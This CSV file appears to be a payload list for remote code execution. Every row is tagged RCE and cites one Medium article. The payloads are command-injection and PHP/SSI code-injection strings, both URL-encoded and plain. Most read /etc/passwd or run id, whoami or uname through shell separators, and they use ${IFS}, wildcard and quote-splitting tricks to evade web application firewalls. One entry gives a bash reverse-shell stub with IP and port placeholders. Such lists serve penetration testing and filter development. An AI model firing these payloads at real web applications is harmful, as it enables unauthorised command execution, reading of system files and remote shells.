cve,tag,payload,url
,RCE,%26%20uname%20-a%20%26id%7C%7Cwhoami%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,id%7Cwhoami%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,id%26%26whoami%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,id%26whoami%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,127.0.0.1%3Bls,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,127.0.0.1%3Bi%22d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bunam%22e%24%7BIFS%7D-a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bl%22s%24%7BIFS%7D-la,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%27i%27d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%22i%22d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%5Cu%5Cn%5Ca%5Cm%5Ce%20%5C-%5Ca,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,cat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,w%24%7Bu%7Dh%24%7Bu%7Do%24%7Bu%7Da%24%7Bu%7Dm%24%7Bu%7Di,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,i%24%28u%29d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,i%60u%60d,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7Buname%2C-a%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,cat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%0aid%0a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%0Aid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%0Aid%0A,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%0a whoami %0a,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,cat%24u%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%22%3Bcat%2B%2Fetc%2Fpasswd%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%2B%5C%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%2F%3F%3F%3F%2F%3F%3Ft%2B%2F%3F%3F%3F%2F%3F%3Fss%3F%3F,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%2F%3Fin%2Fcat%2B%2Fet%3F%2Fpassw%3F,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%2Bcat%2B%2Fe%27tc%2Fpass%27wd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,c%5C%5Ca%5C%5Ct%2B%2Fet%5C%5Cc%2Fpas%5C%5Cswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,cat%20%2Fetc%24u%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%28sy.%28st%29.em%29%28whoami%29%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%2B%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%2B%2Fetc%2Fpasswd%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%24u%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Becho%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%2Fusr%2Fbin%2Fid%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7Ccat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7Ccat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7Ccat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7Ccat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7Ccat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7Cecho%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%2Fusr%2Fbin%2Fid%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%7Ccat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%7Ccat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%7Ccat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%7C%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%7Ccat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%7Ccat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%7Cecho%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7C%7C%2Fusr%2Fbin%2Fid%7C%7C,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%26cat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%26cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%26cat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%26%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%26cat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%26cat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%26echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%26%2Fusr%2Fbin%2Fid%26%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26cat%2520%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26cat%24u%20%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%7Bcat%2C%2Fetc%2Fpasswd%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26cat%3C%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26cat%24IFS%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26%2Fusr%2Fbin%2Fid%26,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%60cat%2520%2Fetc%2Fpasswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%60cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%60cat%24u%20%2Fetc%24u%2Fpasswd%24u%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%60%7Bcat%2C%2Fetc%2Fpasswd%7D%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%60cat%3C%2Fetc%2Fpasswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%60cat%24IFS%2Fetc%2Fpasswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%60echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%60%2Fusr%2Fbin%2Fid%60,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28cat%2520%2Fetc%2Fpasswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28cat%20%2Fe%24%7Bhahaha%7Dtc%2F%24%7Bheywaf%7Dpas%24%7Bcatchthis%7Dswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28cat%24u%20%2Fetc%24u%2Fpasswd%24u%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28%7Bcat%2C%2Fetc%2Fpasswd%7D%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28cat%3C%2Fetc%2Fpasswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28cat%24IFS%2Fetc%2Fpasswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28echo%24%7BIFS%7D%22RCE%22%24%7BIFS%7D%26%26cat%24%7BIFS%7D%2Fetc%2Fpasswd%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28%2Fusr%2Fbin%2Fid%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,cat%20%2Fetc%24u%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%28sy.%28st%29.em%29%28whoami%29%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%2B%2Fetc%2Fpasswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%2B%2Fetc%2Fpasswd%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bcat%24u%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%253B%2524%257B%2540print%2528md5%2528%2522whoami0%2522%2529%2529%257D%253B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%7B%40system%28%22id%22%29%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7Cuname%20-a%2B%7C%7Ca%2B%23%27%2B%7Cls%2B-la%7Ca%2B%23%7C%22%2B%7Cls%2B-la%7C%7Ca%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%22%2Csystem%28%27ls%27%29%3B%22,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%7B%40phpinfo%28%29%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bphpinfo%28%29%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bphpinfo,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bsystem%28%27cat%2520%2Fetc%2Fpasswd%27%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3Bsystem%28%27id%27%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28id%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%24%7B%40print%28md5%28whoami%29%29%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%24%7B%40print%28md5%28%22whoami%22%29%29%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%3Bid,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%24%28%60cat%20%2Fetc%2Fpasswd%60%29,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%7B%7B%20get_user_file%28%22%2Fetc%2Fpasswd%22%29%20%7D%7D,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3C%21--%23exec%20cmd%3D%22id%3B--%3E,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,system%28%27cat%20%2Fetc%2Fpasswd%27%29%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3C%3Fphp%20system%28%22cat%20%2Fetc%2Fpasswd%22%29%3B%3F%3E,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,php%20-r%20%27var_dump%28exec%28%22id%22%29%29%3B%27,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%26lt%3B%21--%23exec%2520cmd%3D%26quot%3Bid%3B--%26gt%3B,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,cat%24u%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%2Fbin%24u%2Fbash%24u%20%3Cip%3E%20%3Cport%3E,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%22%3Bcat%2B%2Fetc%2Fpasswd%2B%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%24u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%2B%24u%2Bcat%2B%2Fetc%24u%2Fpasswd%2B%5C%23,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%2F%3F%3F%3F%2F%3F%3Ft%2B%2F%3F%3F%3F%2F%3F%3Fss%3F%3F,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%2F%3Fin%2Fcat%2B%2Fet%3F%2Fpassw%3F,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,%3B%2Bcat%2B%2Fe%27tc%2Fpass%27wd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,c%5C%5Ca%5C%5Ct%2B%2Fet%5C%5Cc%2Fpas%5C%5Cswd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"|uname -a+||a+#'+|ls+-la|a+#|""+|ls+-la||a+#  Rce waf bypass",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,""",system('ls');"" double quote Rce filter bypass",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"${@system(""id"")} eval code bypass",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,${@phpinfo()},https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;phpinfo();,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;phpinfo,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;system('cat%20/etc/passwd'),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;system('id'),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,$(id),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;${@print(md5(whoami))},https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,";${@print(md5(""whoami""))}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,$;id,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,$(`cat /etc/passwd`),https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"{{ get_user_file(""/etc/passwd"") }}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"<!--#exec cmd=""id;-->",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,system('cat /etc/passwd');,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"<?php system(""cat /etc/passwd"");?>",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"php -r 'var_dump(exec(""id""));'",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&lt;!--#exec%20cmd=&quot;id;--&gt;/bin$u/bash$u <ip> <port>,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,cat$u+/etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,""";cat+/etc/passwd+#",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;+$u+cat+/etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;+$u+cat+/etc$u/passwd+\#,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,/???/??t+/???/??ss??,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,/?in/cat+/et?/passw?,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;+cat+/e'tc/pass'wd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,c\\a\\t+/et\\c/pas\\swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,cat /etc$u/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,(sy.(st).em)(whoami);,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;cat+/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;cat+/etc/passwd+#,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;cat$u+/etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,";{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,";echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,;/usr/bin/id;,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,|cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,|cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,|cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"|{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,|cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,|cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"|echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,|/usr/bin/id|,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,||cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,||cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,||cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"||{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,||cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,||cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"||echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,||/usr/bin/id||,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&&cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&&cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&&cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"&&{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&&cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&&cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"&&echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&&/usr/bin/id&&,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&cat%20/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&cat /e${hahaha}tc/${heywaf}pas${catchthis}swd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&cat$u /etc$u/passwd$u,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"&{cat,/etc/passwd}",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&cat</etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&cat$IFS/etc/passwd,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,"&echo${IFS}""RCE""${IFS}&&cat${IFS}/etc/passwd",https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,&/usr/bin/id&,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,`cat%20/etc/passwd`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,`cat /e${hahaha}tc/${heywaf}pas${catchthis}swd`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
,RCE,`cat$u /etc$u/passwd$u`,https://ansar0047.medium.com/remote-code-execution-unix-and-windows-4ed3367158b3
